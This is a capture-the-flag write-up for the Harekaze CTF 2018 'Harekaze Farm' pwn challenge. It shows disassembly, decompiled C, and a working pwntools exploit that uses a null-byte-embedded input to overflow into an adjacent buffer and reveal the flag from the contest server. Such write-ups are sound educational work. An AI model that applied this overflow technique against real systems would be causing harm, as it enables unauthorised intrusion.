---
layout: post
title: "farm"
---
# harekaze farm - harekaze ctf 2018 

In Harekaze Farm, some animas is living. Let’s find them!

file: [harekaze_farm](https://problem.harekaze.com/32536dfc77c33d38f0a7d40210eee3b7d2547955ab6ae9f1eb92defaf59371a3/harekaze_farm/harekaze_farm)

(Pwn, 100 points)

this challenge was a less trivial buffer overflow than im used to seeing in ctf!

i started by checking the binary mitigations in place:

```
checksec harekaze_farm    
[*] '/home/vagrant/harekaze/harekaze-farm/harekaze_farm'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

upon a quick look i could at the assembly i could tell that the goal was to have a favorite animal called 'isoroku':

```
  |│   0x00400abc      4805a0206000   add rax, obj.select_animals
  |│   0x00400ac2      bed20c4000     mov esi, str.isoroku
  |│   0x00400ac7      4889c7         mov rdi, rax
  |│   0x00400aca      e801fcffff     call sym.imp.strcmp
  |│   0x00400acf      85c0           test eax, eax
 ┌───< 0x00400ad1      757f           jne 0x400b52
 │|│   0x00400ad3      bfe00c4000     mov edi, str.isoroku:__flag_is_here___flag_is_here_
 │|│   0x00400ad8      e893fbffff     call sym.imp.puts
 │|│   0x00400add      488d95f0feff.  lea rdx, [local_110h]
 │|│   0x00400ae4      b800000000     mov eax, 0
 │|│   0x00400ae9      b920000000     mov ecx, 0x20
 │|│   0x00400aee      4889d7         mov rdi, rdx
 │|│   0x00400af1      f348ab         rep stosq qword [rdi], rax
 │|│   0x00400af4      be070d4000     mov esi, 0x400d07
 │|│   0x00400af9      bf090d4000     mov edi, str._home_harekaze_farm_flag
 │|│   0x00400afe      e8ddfbffff     call sym.imp.fopen
 │|│   0x00400b03      488985e8feff.  mov qword [local_118h], rax
 │|│   0x00400b0a      4883bde8feff.  cmp qword [local_118h], 0
┌────< 0x00400b12      7514           jne 0x400b28
││|│   0x00400b14      bf220d4000     mov edi, str.ERROR:_FILE_OPEN_ERROR
││|│   0x00400b19      e852fbffff     call sym.imp.puts
││|│   0x00400b1e      bf01000000     mov edi, 1
││|│   0x00400b23      e8c8fbffff     call sym.imp.exit
└────> 0x00400b28      488b95e8feff.  mov rdx, qword [local_118h]
 │|│   0x00400b2f      488d85f0feff.  lea rax, [local_110h]
 │|│   0x00400b36      beff000000     mov esi, 0xff
 │|│   0x00400b3b      4889c7         mov rdi, rax
 │|│   0x00400b3e      e87dfbffff     call sym.imp.fgets
 │|│   0x00400b43      488d85f0feff.  lea rax, [local_110h]
 │|│   0x00400b4a      4889c7         mov rdi, rax
 │|│   0x00400b4d      e81efbffff     call sym.imp.puts
```

however simply entering 'isoroku' does not work:

````
Welcome to Harekaze farm
Input a name of your favorite animal: sheep 
Input a name of your favorite animal: goat
Input a name of your favorite animal: isoroku
Begin to parade!
sheep: "baa" "baa"
goat: "bleat" "bleat"
```

i wanted an easy way to see how this could be pwned and the assembly was too much to read so i ran the binary through hex rays decompiler:

```c
  puts("Welcome to Harekaze farm");
  for ( i = 0; i <= 2; ++i )
  {
    *(_QWORD *)s1 = 0LL;
    v17 = 0LL;
    printf("Input a name of your favorite animal: ");
    s1[__read_chk(0LL, s1, 16LL, 16LL) - 1] = 0;
    if ( !strcmp(s1, "cow") )
    {
      v3 = (char *)&select_animals + 8 * i;
      v4 = v17;
      *(_QWORD *)v3 = *(_QWORD *)s1;
      *((_QWORD *)v3 + 1) = v4;
    }
    if ( !strcmp(s1, "sheep") )
    {
      v5 = (char *)&select_animals + 8 * i;
      v6 = v17;
      *(_QWORD *)v5 = *(_QWORD *)s1;
      *((_QWORD *)v5 + 1) = v6;
    }
    if ( !strcmp(s1, "goat") )
    {
      v7 = (char *)&select_animals + 8 * i;
      v8 = v17;
      *(_QWORD *)v7 = *(_QWORD *)s1;
      *((_QWORD *)v7 + 1) = v8;
    }
    if ( !strcmp(s1, "hen") )
    {
      v9 = (char *)&select_animals + 8 * i;
      v10 = v17;
      *(_QWORD *)v9 = *(_QWORD *)s1;
      *((_QWORD *)v9 + 1) = v10;
    }
  }
  puts("Begin to parade!");
  for ( j = 0; j <= 2; ++j )
  {
    if ( !strcmp((const char *)(8LL * j + 6299808), "cow") )
      puts("cow: \"moo\" \"moo\"");
    if ( !strcmp((const char *)(8LL * j + 6299808), "sheep") )
      puts("sheep: \"baa\" \"baa\"");
    if ( !strcmp((const char *)(8LL * j + 6299808), "goat") )
      puts("goat: \"bleat\" \"bleat\"");
    if ( !strcmp((const char *)(8LL * j + 6299808), "hen") )
      puts("hen: \"cluck\" \"cluck\"");
    if ( !strcmp((const char *)(8LL * j + 6299808), "isoroku") )
    {
      puts("isoroku: \"flag is here\" \"flag is here\"");
      memset(s1, 0, 0x100uLL);
      stream = fopen("/home/harekaze_farm/flag", "r");
      if ( !stream )
      {
        puts("ERROR: FILE OPEN ERROR");
        exit(1);
      }
      fgets(s1, 255, stream);
      puts(s1);
    }
  }
  result = 0;
  v12 = *MK_FP(__FS__, 40LL) ^ v18;
  return result;
}
```

so our input is taken in with the read system call (size 16) which i know can accept null bytes, strcpy will stop comparing on null bytes as well..

so with that i could write my exploit!

```python
#!/usr/bin/python

from pwn import *

REMOTE = True 
#DEBUG = True
DEBUG = False

host = 'problem.harekaze.com'
port = 20328

def getpipe():
    if REMOTE:
        return remote(host, port)
    else:
        return process('./harekaze_farm')

r = getpipe()

gdbscript = '''
b *0x00400aca
c
'''

if DEBUG:
    gdb.attach(r, gdbscript)

r.recvuntil('al: ')
r.sendline('sheep\x00AAisoroku')
r.recvuntil('al: ')
r.sendline('burps')
r.recvuntil('al: ')
r.sendline('hen')

r.interactive()

r.close()

'''
[+] Opening connection to problem.harekaze.com on port 20328: Done
[+] Opening connection to problem.harekaze.com on port 20328: Done
[*] Switching to interactive mode
Begin to parade!
sheep: "baa" "baa"
isoroku: "flag is here" "flag is here"
HarekazeCTF{7h1s_i5_V3ry_B3ginning_BoF}
'''
```
